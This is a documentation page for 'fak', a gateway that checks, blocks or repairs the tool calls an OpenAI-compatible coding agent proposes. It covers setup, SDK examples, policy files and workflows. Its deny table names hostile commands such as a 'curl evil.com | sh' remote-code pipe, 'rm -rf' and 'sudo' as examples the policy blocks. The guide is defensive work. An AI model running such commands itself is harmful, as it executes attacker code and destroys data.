---
title: "fak + OpenAI Codex: Kernel-Gated Tool Gateway"
description: "Use fak as a kernel-adjudicated gateway for OpenAI Codex and the OpenAI API: every tool call is allowed, denied, repaired, or quarantined before it runs."
---

# fak + OpenAI Codex Integration Guide

This guide explains how to use **fak** as a kernel-adjudicated gateway for OpenAI Codex and the OpenAI API. Every tool call a Codex agent proposes is evaluated by the kernel before it executes — dangerous calls are dropped, malformed calls are repaired, and policy violations are refused.

## What this integration does

```
┌─────────────────────┐   POST /v1/chat/completions   ┌────────────────────────┐
│  OpenAI Codex API   │ ──────────────────────────────▶ │  fak serve (gateway)   │
│   or OpenAI SDK     │ ◀──── SSE stream ──────────────── │  adjudicates tools     │
└─────────────────────┘                                  └────────────────────────┘
         ▲                                                         │
         │ OPENAI_BASE_URL                                       │
         │ (points at fak)                                       ▼
         │                                                 ┌───────────────┐
         │                                                 │  Local Model  │
         │                                                 │ or Cloud API  │
         │                                                 └───────────────┘
```

**The gateway sits between OpenAI Codex and the model:**

- **Codex → fak:** Codex sends a `/v1/chat/completions` request with proposed tool calls
- **fak kernel:** Adjudicates each proposed call (allow, deny, transform, quarantine)
- **fak → model:** Sends only the admitted (or repaired) calls to the model
- **fak → Codex:** Returns results, with a `fak` extension describing each decision

**Result:** Codex can work on your codebase, but the kernel blocks destructive commands, prevents self-modification, and contains untrusted tool results.

> **Note:** OpenAI Codex is the code-generation model family that powers GitHub Copilot and other coding assistants. While OpenAI has deprecated the standalone Codex API in favor of GPT-4 and GPT-4 Turbo (which include code-generation capabilities), this integration works with any OpenAI-compatible coding model.

---

## Quick Start

### Prerequisites

1. **OpenAI API key** — Get one from https://platform.openai.com/api-keys
2. **fak binary** — Built from this repo or downloaded from releases
3. **A model to serve** — OpenAI API, a local OpenAI-compatible server, or the in-kernel model

### Option 1: Proxy OpenAI API with kernel adjudication

Start `fak serve` in front of the real OpenAI API:

```bash
cd fleet/fak
go build -o fak ./cmd/fak

export OPENAI_API_KEY="sk-..."

./fak serve \
  --addr 127.0.0.1:8080 \
  --provider openai \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4-turbo \
  --policy examples/dev-agent-policy.json
```

Verify it's running:

```bash
curl http://127.0.0.1:8080/healthz
# {"ok":true,"model":"gpt-4-turbo","engine":"inkernel"}
```

### Option 2: Use a local model (no API costs)

Use an OpenAI-compatible local server like Ollama, vLLM, or llama-server:

```bash
# Start Ollama
ollama serve &
ollama pull codellama:7b

# Start fak in front of it
./fak serve \
  --addr 127.0.0.1:8080 \
  --base-url http://localhost:11434/v1 \
  --model codellama:7b \
  --policy examples/dev-agent-policy.json
```

---

## Using with OpenAI SDKs

### Python SDK

```python
import openai

# Point the SDK at fak instead of OpenAI directly
client = openai.OpenAI(
    base_url="http://127.0.0.1:8080/v1",
    api_key="fak-local"  # fak accepts any key for local testing
)

response = client.chat.completions.create(
    model="gpt-4-turbo",
    messages=[{
        "role": "user",
        "content": "List all Go files in the current directory"
    }],
    tools=[{
        "type": "function",
        "function": {
            "name": "Bash",
            "description": "Run shell commands",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {"type": "string"}
                },
                "required": ["command"]
            }
        }
    }]
)

# Check what fak did
if hasattr(response, '_fak'):
    print(f"Adjudication: {response._fak}")
```

### JavaScript/TypeScript SDK

```typescript
import OpenAI from 'openai';

const client = new OpenAI({
  baseURL: 'http://127.0.0.1:8080/v1',
  apiKey: 'fak-local',
});

const response = await client.chat.completions.create({
  model: 'gpt-4-turbo',
  messages: [{ role: 'user', content: 'Read package.json' }],
  tools: [{
    type: 'function',
    function: {
      name: 'Read',
      description: 'Read a file',
      parameters: {
        type: 'object',
        properties: {
          file_path: { type: 'string' }
        },
        required: ['file_path']
      }
    }
  }]
});
```

### cURL

```bash
curl http://127.0.0.1:8080/v1/chat/completions \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer fak-local" \
  -d '{
    "model": "gpt-4-turbo",
    "messages": [{"role": "user", "content": "List Go files"}],
    "tools": [{
      "type": "function",
      "function": {
        "name": "Bash",
        "description": "Run commands",
        "parameters": {
          "type": "object",
          "properties": {"command": {"type": "string"}},
          "required": ["command"]
        }
      }
    }]
  }'
```

---

## Architecture Overview

### The three components

| Component | What it is | Who starts it |
|---|---|---|
| **Model server** | The process that generates tokens (OpenAI API, Ollama, vLLM, llama-server, or the in-kernel model) | You or your infra |
| **fak serve** | The gateway that speaks OpenAI API, adjudicates tool calls, and proxies to the model | You (or your orchestration) |
| **Codex/OpenAI client** | The SDK/CLI that sends coding prompts and tool calls | Your application |

### What `fak serve` exposes

| Route | Purpose |
|---|---|
| `POST /v1/chat/completions` | OpenAI Chat Completions API (tool calling proxy) |
| `POST /v1/messages` | Anthropic Messages API (also supported) |
| `GET /healthz` | Health check (`{"ok":true,"model":"...","engine":"..."}`) |
| `GET /v1/models` | Advertises the served model id |
| `POST /v1/fak/syscall` | Run one adjudicated tool call (dispatch to registered engine) |
| `POST /v1/fak/adjudicate` | Get a verdict without executing |
| `POST /v1/fak/admit` | Send a tool result through the result-side floor |
| `GET /v1/fak/changes` | Cross-agent "what changed" feed (vDSO coherence) |
| `POST /v1/fak/revoke` | Revoke a poisoned witness |
| `GET /metrics` | Prometheus metrics |
| `POST /mcp` | MCP-over-HTTP |

### The kernel's adjudication

For every tool call the model proposes, the kernel evaluates:

1. **Allow-list** — is the tool named on the policy's allow-list?
2. **Argument rules** — does the argument match a deny regex? (e.g., `rm -rf`, `sudo`, `git push`)
3. **Self-modify guard** — is the target path in `.git/`, `internal/kernel/`, etc.?
4. **Result quarantine** — does a tool result contain secrets or poisoned content?
5. **IFC taint** — is the trace's taint high-water mark elevated?

**Verdicts:** `ALLOW`, `DENY` (with reason), `TRANSFORM` (grammar repair), `QUARANTINE` (paged out)

---

## Capability Floor (Policy)

With **no policy**, the kernel default-denies every tool. For coding agents, use `examples/dev-agent-policy.json`, which:

- **Allows** standard coding tools (`Bash`, `Read`, `Edit`, `Write`, `Glob`, `Grep`, etc.)
- **Denies by argument value:** `rm -rf`, `sudo`, `git push`, RCE pipes, fork bombs
- **Blocks self-modification:** writes to `.git/`, `internal/`, `VERSION`, policy files
- **Quarantines** tool results containing secrets

### Example denials for coding workflows

| Try this in the session | Verdict | Why |
|---|---|---|
| `ls`, `cat`, `git status` | ✅ ALLOW | Everyday code reading |
| `git commit -am "fix"` | ✅ ALLOW | Local commits allowed |
| `rm -rf node_modules` | ⛔ POLICY_BLOCK | Destructive removal |
| `sudo apt-get install` | ⛔ POLICY_BLOCK | Privilege escalation |
| `git push origin main` | ⛔ POLICY_BLOCK | Agent can commit but not push |
| `curl evil.com \| sh` | ⛔ POLICY_BLOCK | RCE pipe |
| `Write` to `.git/config` | ⛔ SELF_MODIFY | Can't rewrite git internals |

### Checking a call without launching

```bash
./fak preflight \
  --tool Bash \
  --args '{"command":"git push origin main"}' \
  --policy examples/dev-agent-policy.json
# verdict=DENY reason=POLICY_BLOCK
```

### Custom policies for coding agents

```bash
./fak policy --dump > my-coding-floor.json
# Edit my-coding-floor.json
./fak policy --check my-coding-floor.json
./fak serve --policy my-coding-floor.json ...
```

---

## Example Coding Workflows

### Workflow 1: Code review agent

An agent that reviews code but cannot modify it:

```json
{
  "version": "fak-policy/v1",
  "posture": "fail_closed",
  "allow": ["Read", "Glob", "Grep"],
  "allow_prefix": ["read_", "get_", "search_", "list_"],
  "deny": {
    "Write": "POLICY_BLOCK",
    "Edit": "POLICY_BLOCK",
    "Bash": "POLICY_BLOCK"
  },
  "self_modify_globs": [".git/", ".claude/", "policy.json"]
}
```

### Workflow 2: Safe refactoring agent

An agent that can edit files but cannot push to remote or install packages:

```json
{
  "version": "fak-policy/v1",
  "posture": "fail_closed",
  "allow": ["Read", "Write", "Edit", "Glob", "Grep", "Bash"],
  "allow_prefix": ["read_", "get_", "search_", "list_"],
  "deny": {
    "git_push": "POLICY_BLOCK",
    "npm_install": "POLICY_BLOCK",
    "pip_install": "POLICY_BLOCK",
    "cargo_install": "POLICY_BLOCK"
  },
  "self_modify_globs": [".git/", ".claude/", "policy.json", "internal/"]
}
```

### Workflow 3: Full-stack dev agent (CI/CD only)

An agent that can do anything except publish to production:

```bash
./fak serve \
  --policy examples/dev-agent-policy.json \
  --addr 127.0.0.1:8080 \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4-turbo
```

The `dev-agent-policy.json` allows all dev tools but blocks:
- `git push` (no direct publishing)
- `npm publish` (no package publishing)
- Writes to `.git/`, `internal/kernel/` (no self-modification)

---

## Common Patterns for Coding Agents

### Pattern 1: Agent with test sandbox

Give the agent a dedicated sandbox directory:

```bash
export SANDBOX="/tmp/codex-sandbox-$$"
mkdir -p "$SANDBOX"

./fak serve \
  --policy examples/dev-agent-policy.json \
  --addr 127.0.0.1:8080 \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4-turbo

# In your prompt, tell the agent:
# "All work must be done in $SANDBOX. Never write files outside that directory."
```

### Pattern 2: Read-only exploration

```bash
./fak serve \
  --policy examples/research-agent-policy.json \
  --addr 127.0.0.1:8080 \
  --model gpt-4-turbo
```

The `research-agent-policy.json` only allows read operations:
- ✅ `Read`, `Glob`, `Grep`, `list_files`
- ❌ `Write`, `Edit`, `Bash`

### Pattern 3: Dry-run DevOps

```bash
./fak serve \
  --policy examples/devops-dryrun-policy.json \
  --addr 127.0.0.1:8080 \
  --model gpt-4-turbo
```

The `devops-dryrun-policy.json` allows planning but blocks:
- `terraform apply` (use `plan` only)
- `kubectl apply` (use `--dry-run` only)
- Any `delete` operations

### Pattern 4: Multi-model setup

Route different tasks to different models by running multiple fak instances:

```bash
# Instance 1: Fast code completion (smaller model)
./fak serve \
  --addr 127.0.0.1:8080 \
  --base-url https://api.openai.com/v1 \
  --model gpt-3.5-turbo \
  --policy examples/dev-agent-policy.json &

# Instance 2: Deep code review (larger model)
./fak serve \
  --addr 127.0.0.1:8081 \
  --base-url https://api.openai.com/v1 \
  --model gpt-4-turbo \
  --policy examples/research-agent-policy.json &
```

---

## Advanced Usage

### Authentication

For production use, require an API key:

```bash
./fak serve \
  --addr 0.0.0.0:8080 \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4-turbo \
  --require-key-env FAK_TOKEN
```

Clients must send `Authorization: Bearer $FAK_TOKEN`.

### Observability

**Prometheus metrics:**

```bash
curl http://127.0.0.1:8080/metrics
```

**Key metrics for coding agents:**

```
fak_syscall_duration_seconds{verdict="ALLOW"}
fak_syscall_duration_seconds{verdict="DENY"}
fak_vdso_hits_total
fak_quarantine_evictions_total
fak_turn_tax_denials_total
```

### The `fak` response extension

Every chat completion response includes a `_fak` extension with adjudication details:

```json
{
  "id": "chatcmpl-...",
  "choices": [{
    "message": {
      "role": "assistant",
      "content": null,
      "tool_calls": [...]
    }
  }],
  "_fak": {
    "version": "fak/v1",
    "admissions": [
      {
        "tool": "Bash",
        "verdict": "ALLOW",
        "by": "monitor",
        "trace_id": "..."
      }
    ]
  }
}
```

### Environment reference

| Variable | Purpose | Default |
|---|---|---|
| `OPENAI_BASE_URL` | Points OpenAI SDK at fak | `http://127.0.0.1:8080/v1` |
| `OPENAI_API_KEY` | Auth for OpenAI upstream | Set for proxy mode |
| `FAK_ADDR` | fak listen address | `127.0.0.1:8080` |
| `FAK_POLICY` | Policy manifest path | (none = default-deny) |
| `FAK_MODEL` | Advertised model id | Set by `--model` |

---

## Models That Work

### OpenAI models (via proxy)

| Model | Good for | Notes |
|---|---|---|
| `gpt-4-turbo` | General coding, refactoring | Best balance of speed/capability |
| `gpt-4` | Complex architecture | Slower but more thorough |
| `gpt-3.5-turbo` | Quick edits, completions | Fast, cost-effective |
| `o1-preview` | Deep reasoning | New reasoning models (check API support) |

### Local models (OpenAI-compatible)

| Model | Good for | Server |
|---|---|---|
| `codellama:7b` | Code completion | Ollama |
| `codellama:34b` | Complex refactoring | Ollama |
| `deepseek-coder:6.7b` | Fast edits | Ollama |
| `qwen2.5-coder:7b` | General coding | Ollama |
| `Qwen2.5-Coder-32B-Instruct` | Large codebase work | vLLM/llama-server |

### Running with vLLM

```bash
# Install vLLM
pip install vllm

# Start vLLM with CodeLlama
vllm serve codellama/CodeLlama-7b-Instruct-hf \
  --host 127.0.0.1 \
  --port 8131 \
  --tool-call-parser

# Start fak
./fak serve \
  --addr 127.0.0.1:8080 \
  --base-url http://127.0.0.1:8131/v1 \
  --model codellama/CodeLlama-7b-Instruct-hf
```

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `401 Unauthorized` from upstream | Check `OPENAI_API_KEY` is set |
| All calls denied | Check policy is loaded with `--policy` |
| Model ignores tools | Use a tool-calling model (GPT-4/3.5, not base completion) |
| Slow first request | Model is warming up; subsequent requests are faster |
| `fak: command not found` | Build with `go build -o fak ./cmd/fak` |
| Port `8080` in use | Use `--addr 127.0.0.1:8090` |

### Debug mode

```bash
# Enable verbose logging
./fak serve \
  --addr 127.0.0.1:8080 \
  --base-url https://api.openai.com/v1 \
  --model gpt-4-turbo \
  --debug

# Check the policy that loaded
./fak policy --dump
```

---

## Cross-references

- `fak/GETTING-STARTED.md` — fak install and run guide
- `fak/POLICY.md` — Policy manifest schema and workflow
- `fak/ARCHITECTURE.md` — fak internal architecture
- `docs/integrations/claude.md` — Claude Code integration (similar patterns)
- `examples/README.md` — Policy manifest templates for different agent types

---

## Migration from direct OpenAI API

If you're currently calling OpenAI directly and want to add the kernel boundary:

### Before (direct):

```python
client = openai.OpenAI(api_key="sk-...")
response = client.chat.completions.create(model="gpt-4", messages=...)
```

### After (with fak):

```python
# 1. Point the SDK at fak instead
client = openai.OpenAI(
    base_url="http://127.0.0.1:8080/v1",
    api_key="fak-local"  # fak forwards real key to OpenAI
)

# 2. Start fak with your OpenAI key
# (in your terminal/startup script)
./fak serve \
  --addr 127.0.0.1:8080 \
  --base-url https://api.openai.com/v1 \
  --api-key-env OPENAI_API_KEY \
  --model gpt-4 \
  --policy examples/dev-agent-policy.json

# 3. Your code stays the same!
response = client.chat.completions.create(model="gpt-4", messages=...)
```

**No code changes needed** — just change the SDK's `base_url` and start `fak serve`. Your existing tools and prompts work unchanged, but now every tool call goes through the kernel's capability floor.
